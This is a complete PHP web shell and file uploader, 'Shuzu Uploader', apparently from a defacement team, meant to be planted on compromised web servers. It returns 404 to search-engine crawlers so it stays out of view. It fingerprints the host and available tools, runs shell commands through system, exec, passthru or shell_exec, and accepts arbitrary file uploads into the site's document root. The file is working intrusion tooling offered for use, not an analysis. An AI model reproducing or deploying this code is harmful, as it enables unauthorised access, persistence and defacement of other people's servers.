<style>
table{
	background: black;
	border: solid 1px red;
}
h1{
	color: white;
	font-face: monospace;
	size: 10;
	text-align: center;
	text-shadow:0 1px 0 red;
}
a{
	color: white;
	text-decoration:none
}
.cont a{

 text-decoration: none;
 font-family: Monospace  ;
 font-size: 16px;
}
button{
	background: transparent;
	border: 1px solid red;
}
</style>
<?php
##407 Authentic Exploit - Coder Team##
error_reporting(0);
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
?>
<html>
<head>
<title>[ Shuzu Uploader ]</title>
<meta name='author' content='./Shuzu404'>
<meta charset="UTF-8">
<style type='text/css'>
body{
	background: black;
	font-family: monospace;
}
</style>
<?php
function asu($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function kontol($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$dia = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $dia; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$dia = ""; 		
		foreach($results as $result) { 			
			$dia .= $result; 		
		} return $dia; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$dia = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $dia; 	
	} elseif(function_exists('shell_exec')) { 		
		$dia = @shell_exec($cmd); 		
		return $dia; 	
	} 
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$python = (exe('python --help')) ? "<font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$php = (exe('php --help')) ? " <font size=2 color=lime>ON</font>" : "<font size=2 color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font size=2 color=red>$ds</font>" : "<font size=2 color=lime>NONE</font>";
$sym = (exe('cd /etc/')) ? "<font size=2 color=lime>Maybe ON</font>" : "<font size=2 color=red>OFF</font>";
echo "<center><img src=https://i.ibb.co/VB5T9Z7/1561270445438.png width=40% height=25%></center>";
echo'<center><table>
<tr><td>';
echo "<font size=2 color=white>System: </font><font size=2 color=lime>".$kernel."</font><br>";
echo "<font size=2 color=white>Server IP: <font size=2 color=lime>".$ip."</font> | Your IP: <font size=2 color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "<font size=2 color=white>Safe Mode: $sm | <font size=2 color=white>Disable Functions: $show_ds<br>";
echo "<font size=2 color=white>MySQL: $mysql | Perl: $perl | Python: $python | PhP: $php | WGET: $wget | CURL: $curl | Symlink: $sym <br>";
echo '</font></font></td></tr></table>
<tr><td><center>
<br>
</br>';
echo "<font color=red><form method='post' enctype='multipart/form-data'>
      <center><input type='file' name='idx_file'>
      <input type='submit' name='upload' value='upload'></center>
      </form></font>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "<font color=lime size=4>Uploaded: <font color=white><a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></font></font></a>";
        } else {
            echo "<font color=red size=4>Failed Upload</font>";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "<font color=lime size=4>Uploaded: <font color=white><b>$files</b></font></font>";
        } else {
            echo "<font color=red size=4>Failed Upload</font>";
        }
    }
}
?>
<br>
</br>
<br>
</br>
<button><a href=http://blog.anontech.me>Visit Our Blog</a></button>